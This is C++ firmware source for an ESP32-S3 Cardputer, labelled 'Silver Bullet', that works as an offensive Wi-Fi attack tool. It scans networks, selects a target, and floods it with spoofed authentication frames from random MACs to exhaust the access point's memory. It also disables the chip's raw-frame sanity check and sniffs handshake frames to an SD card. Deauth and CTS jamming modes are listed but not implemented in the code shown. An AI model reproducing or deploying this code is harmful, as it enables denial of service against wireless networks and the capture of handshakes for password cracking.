/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Híbrido (Exaustão + SD Card Nativo no SPI3)
 * @hardware ESP32-S3 (M5Stack Cardputer) - ESP-IDF v4.4
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <stdio.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <freertos/queue.h>
#include <atomic>

// --- BIBLIOTECAS NATIVAS ESP-IDF ---
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"
#include "driver/sdspi_host.h"
#include "driver/spi_common.h"
#include "driver/gpio.h"

#include "esp_random.h"
#include "esp_log.h" 

extern "C" __attribute__((used)) int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
    return 0; 
}

// ===================================================================
// ESTRUTURAS DE PACOTES
// ===================================================================

struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t reason_code;
};

struct __attribute__((packed)) AuthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t auth_algorithm; uint16_t auth_seq; uint16_t status_code;
};

struct __attribute__((packed)) CtsPacket {
    uint16_t frame_control; uint16_t duration; uint8_t  mac_ra[6];     
};

// ===================================================================
// VARIÁVEIS GLOBAIS E ENUMS
// ===================================================================

#define MAX_ALVOS 20
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 
std::atomic<bool> flag_update_config{false}; 

std::atomic<uint32_t> pacotes_enviados_segundo{0};
std::atomic<uint32_t> pps_atual{0};
std::atomic<uint32_t> pacotes_capturados{0};

SemaphoreHandle_t display_mutex = NULL;
SemaphoreHandle_t scan_mutex = NULL;

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

enum ModoAtaque { MODO_EXAUSTAO, MODO_DEAUTH, MODO_CTS, MODO_SNIFFER };
std::atomic<ModoAtaque> modo_ativo{MODO_EXAUSTAO};

const char* get_nome_modo() {
    switch(modo_ativo.load()) {
        case MODO_EXAUSTAO: return "ATAQUE: EXAUSTAO RAM";
        case MODO_DEAUTH:   return "ATAQUE: DEAUTH BLOCK";
        case MODO_CTS:      return "ATAQUE: CTS JAMMING";
        case MODO_SNIFFER:  return "ESCUTA: GRAVANDO NO SD";
        default:            return "ANALISANDO...";
    }
}

// ===================================================================
// SISTEMA NATIVO DE CARTÃO SD E FILA DO SNIFFER
// ===================================================================

bool sd_conectado = false;
FILE* pcap_file = NULL;

#define MAX_PKT_SIZE 256
struct SnifferPacket {
    uint16_t len;
    uint8_t payload[MAX_PKT_SIZE];
};
QueueHandle_t fila_sniffer = NULL;

void inicializar_sd() {
    // 1. Configurar as resistências elétricas internas para os pinos do Cartão SD (Muito importante!)
    gpio_set_pull_mode((gpio_num_t)14, GPIO_PULLUP_ONLY); // MOSI
    gpio_set_pull_mode((gpio_num_t)39, GPIO_PULLUP_ONLY); // MISO
    gpio_set_pull_mode((gpio_num_t)40, GPIO_PULLUP_ONLY); // CLK
    gpio_set_pull_mode((gpio_num_t)12, GPIO_PULLUP_ONLY); // CS

    esp_vfs_fat_sdmmc_mount_config_t mount_config = {};
    mount_config.format_if_mount_failed = false;
    mount_config.max_files = 5;
    mount_config.allocation_unit_size = 16 * 1024;
    
    sdmmc_card_t *card;
    const char mount_point[] = "/sdcard";

    // 2. A MAGIA: Usamos o SPI3_HOST. Assim o ecrã fica com o SPI2 e não há mais conflitos!
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI3_HOST; 
    host.max_freq_khz = 20000;

    spi_bus_config_t bus_cfg = {};
    bus_cfg.mosi_io_num = 14;
    bus_cfg.miso_io_num = 39;
    bus_cfg.sclk_io_num = 40;
    bus_cfg.quadwp_io_num = -1;
    bus_cfg.quadhd_io_num = -1;
    bus_cfg.max_transfer_sz = 4000;

    // 3. Inicializa o barramento SPI independente
    esp_err_t ret = spi_bus_initialize((spi_host_device_t)host.slot, &bus_cfg, SPI_DMA_CH_AUTO);
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_LOGE("SD", "Falha ao inicializar o SPI3: %s", esp_err_to_name(ret));
        return;
    }

    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = (gpio_num_t)12;
    slot_config.host_id = (spi_host_device_t)host.slot;

    // 4. Monta o cartão e aloca a memória
    ret = esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config, &mount_config, &card);
    if (ret != ESP_OK) {
        ESP_LOGE("SD", "Falha ao montar SD! Verifique o cartao. Erro: 0x%x", ret);
        sd_conectado = false;
    } else {
        ESP_LOGI("SD", "Cartao SD montado com SUCESSO! 100%% independente.");
        sd_conectado = true;
    }
}

// Callback de rádio cru (Captura para o SD)
void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (modo_ativo.load() != MODO_SNIFFER || !sd_conectado) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Apanha pacotes EAPOL (Handshakes) e de Gestão
    if (frame[0] == 0x08 || frame[0] == 0x88 || frame[0] == 0x00) { 
        SnifferPacket sp;
        sp.len = (len > MAX_PKT_SIZE) ? MAX_PKT_SIZE : len;
        memcpy(sp.payload, frame, sp.len);
        
        BaseType_t xHigherPriorityTaskWoken = pdFALSE;
        if(fila_sniffer) {
            xQueueSendFromISR(fila_sniffer, &sp, &xHigherPriorityTaskWoken);
        }
    }
}

// ===================================================================
// MOTOR DE INJEÇÃO (ATAQUE & ESCRITA SD)
// ===================================================================

void task_ataque(void *pvParameters) {
    AuthPacket* auth = (AuthPacket*) malloc(sizeof(AuthPacket));
    bool config_radio_aplicada = false;
    uint8_t mac_alvo_local[6] = {0};

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
            
            if (!config_radio_aplicada || flag_update_config.load()) {
                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                config_radio_aplicada = true; flag_update_config.store(false);
                
                if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                    memcpy(mac_alvo_local, alvos_encontrados[alvo_selecionado].bssid, 6);
                    xSemaphoreGive(scan_mutex);
                }

                auth->frame_control = 0x00B0; auth->duration = 314; 
                memcpy(auth->mac_dest, mac_alvo_local, 6); 
                memcpy(auth->mac_bssid, mac_alvo_local, 6);
                auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;

                if (modo_ativo.load() == MODO_SNIFFER) {
                    if (sd_conectado && pcap_file == NULL) {
                        pcap_file = fopen("/sdcard/captura.raw", "a");
                    }
                    esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
                    esp_wifi_set_promiscuous(true);
                } else {
                    esp_wifi_set_promiscuous(false);
                    if (pcap_file) { fclose(pcap_file); pcap_file = NULL; }
                }
            }

            uint32_t pps_lote = 0; 
            
            if (modo_ativo.load() == MODO_EXAUSTAO) {
                for (int i = 0; i < 40; i++) {
                    auth->mac_src[0] = 0x02; 
                    for(int m=1; m<6; m++) auth->mac_src[m] = esp_random() & 0xFF;
                    auth->seq_ctrl = (esp_random() & 0xFFF) << 4;

                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pps_lote++;
                    else break; 
                }
                if (pps_lote > 0) pacotes_enviados_segundo.fetch_add(pps_lote, std::memory_order_relaxed);
                vTaskDelay(1); 
                
            } else if (modo_ativo.load() == MODO_SNIFFER) {
                // Guarda os Handshakes no Cartão SD a partir da Fila (Sem travar o rádio)
                SnifferPacket sp;
                if (xQueueReceive(fila_sniffer, &sp, pdMS_TO_TICKS(10)) == pdTRUE) {
                    if (pcap_file) {
                        fwrite(sp.payload, 1, sp.len, pcap_file);
                        pacotes_capturados++;
                        // Força a gravação real no SD a cada 10 pacotes
                        if (pacotes_capturados % 10 == 0) fflush(pcap_file); 
                    }
                }
            } else {
                vTaskDelay(pdMS_TO_TICKS(10)); 
            }

        } else {
            if (config_radio_aplicada && modo_ativo.load() == MODO_SNIFFER) {
                esp_wifi_set_promiscuous(false);
                if (pcap_file) { fclose(pcap_file); pcap_file = NULL; }
            }
            config_radio_aplicada = false; 
            vTaskDelay(pdMS_TO_TICKS(100)); 
        }
    }
}

// ===================================================================
// INTERFACE E MENUS
// ===================================================================

void escanear_redes() {
    alvo_perdido.store(false);
    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
        M5.Display.println("📡 Escaneando Redes...");
        xSemaphoreGive(display_mutex);
    }
    esp_wifi_set_mode(WIFI_MODE_STA); 
    wifi_scan_config_t scan_config = {}; scan_config.show_hidden = true; scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    esp_wifi_scan_start(&scan_config, true); 
    
    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
        esp_wifi_scan_get_ap_num(&total_alvos);
        uint16_t max_aps = MAX_ALVOS; 
        esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
        if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
        xSemaphoreGive(scan_mutex);
    }
    alvo_selecionado = 0; estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
        
        const char* modo_str = "EXAUSTAO";
        if(modo_ativo.load() == MODO_DEAUTH) modo_str = "DEAUTH";
        else if(modo_ativo.load() == MODO_CTS) modo_str = "CTS";
        else if(modo_ativo.load() == MODO_SNIFFER) modo_str = "SNIFFER (SD)";

        M5.Display.printf("⚡ PWR: %s | SD: %s\n", tx_power_max.load() ? "MAX" : "ECO", sd_conectado ? "OK" : "FALHA");
        M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);

        if (total_alvos == 0) { 
            M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.println("Nenhum alvo encontrado!"); 
        } else {
            int inicio = (alvo_selecionado / 5) * 5;
            if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
                    if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
                    else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                    bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
                    M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
                }
                xSemaphoreGive(scan_mutex);
            }
        }
        xSemaphoreGive(display_mutex);
    }
}

void task_display(void *pvParameters) {
    TickType_t ultimo_tempo_pps = xTaskGetTickCount();
    while (true) {
        TickType_t tempo_atual = xTaskGetTickCount();
        if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
            pps_atual.store(pacotes_enviados_segundo.exchange(0, std::memory_order_relaxed)); 
            ultimo_tempo_pps = tempo_atual;
        }

        if (estado_atual.load() == ESTADO_ATIRAR) {
            if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
                M5.Display.setCursor(0, 0);
                if (!alvo_perdido.load()) {
                    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                    char alvo_ssid[33] = {0};
                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                        strncpy(alvo_ssid, (char*)alvos_encontrados[alvo_selecionado].ssid, 32);
                        xSemaphoreGive(scan_mutex);
                    }
                    M5.Display.printf("⚔️ ALVO: %s\n", alvo_ssid);
                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                    M5.Display.printf("CH: %d | SD: %s\n", canal_atual_alvo.load(), sd_conectado ? "GRAVANDO" : "FALHA");

                    M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
                    M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                    M5.Display.printf("> %s\n", get_nome_modo());
                    
                    M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                    
                    if (modo_ativo.load() == MODO_SNIFFER) {
                        M5.Display.printf(">> CAPTURADOS: %u PKT <<\n",  (unsigned int)pacotes_capturados.load());
                    } else {
                        M5.Display.printf(">> INJETANDO: %u PPS <<\n",  (unsigned int)pps_atual.load());
                    }

                }
                xSemaphoreGive(display_mutex);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(200)); 
    }
}

// ===================================================================
// INICIALIZAÇÃO I2C E CONTROLES
// ===================================================================

#define TCA8418_ADDR 0x34
#define TCA8418_KP_GPIO1 0x1D
#define TCA8418_KP_GPIO2 0x1E
#define TCA8418_KP_GPIO3 0x1F
#define TCA8418_CFG 0x01
#define TCA8418_KEY_LCK_EC 0x03
#define TCA8418_KEY_EVENT_A 0x04

void inicializar_teclado() {
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO1, 0xFF, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO2, 0xFF, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO3, 0x03, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_CFG, 0x00, 400000); 
}

void task_controles(void *pvParameters) {
    inicializar_teclado();
    while (true) {
        M5.update(); 
        uint8_t ec = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_LCK_EC, 400000);
        uint8_t count = ec & 0x0F; 
        
        while (count > 0) {
            uint8_t event = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_EVENT_A, 400000);
            bool pressed = (event & 0x80) != 0;
            uint8_t keycode = event & 0x7F; 
            
            if (pressed) {
                if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
                    if (keycode == 58) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); }
                    else if (keycode == 43 || keycode == 57) { alvo_selecionado = (alvo_selecionado == 0) ? (total_alvos - 1) : (alvo_selecionado - 1); desenhar_menu(); }
                    else if (keycode == 59) { int m = modo_ativo.load(); m = (m + 1) % 4; modo_ativo.store(static_cast<ModoAtaque>(m)); desenhar_menu(); }
                    else if (keycode == 56) { int m = modo_ativo.load(); m = (m == 0) ? 3 : (m - 1); modo_ativo.store(static_cast<ModoAtaque>(m)); desenhar_menu(); }
                    else if (keycode == 67) { 
                        uint8_t ch = 1;
                        if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) { ch = alvos_encontrados[alvo_selecionado].primary; xSemaphoreGive(scan_mutex); }
                        canal_atual_alvo.store(ch); 
                        if(xSemaphoreTake(display_mutex, portMAX_DELAY)) { M5.Display.clear(); xSemaphoreGive(display_mutex); }
                        flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR);
                    }
                }
                else if (estado_atual.load() == ESTADO_ATIRAR) {
                    if (keycode == 97) { 
                        estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu(); 
                    }
                }
            }
            count--;
        }
        vTaskDelay(pdMS_TO_TICKS(50)); 
    }
}

// ===================================================================
// APP MAIN
// ===================================================================

extern "C" void app_main(void) {
    // Liga a Tela primeiro (Ecrã = SPI2)
    auto cfg = M5.config(); 
    M5.begin(cfg); 
    M5.Display.setRotation(1); 
    M5.Display.setTextSize(1.5);
    
    display_mutex = xSemaphoreCreateMutex();
    scan_mutex = xSemaphoreCreateMutex();
    fila_sniffer = xQueueCreate(50, sizeof(SnifferPacket));

    // Liga o Cartão SD isolado (SD = SPI3). Zero conflitos!
    inicializar_sd();

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase()); ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    esp_netif_init(); esp_event_loop_create_default();
    
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg); 
    esp_wifi_set_storage(WIFI_STORAGE_RAM); 
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start(); 
    esp_wifi_set_ps(WIFI_PS_NONE); 

    xTaskCreatePinnedToCore(task_ataque, "ataque", 8192, NULL, 15, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 0); 
    xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 0); 

    vTaskDelay(pdMS_TO_TICKS(1000)); 
    escanear_redes(); desenhar_menu();
}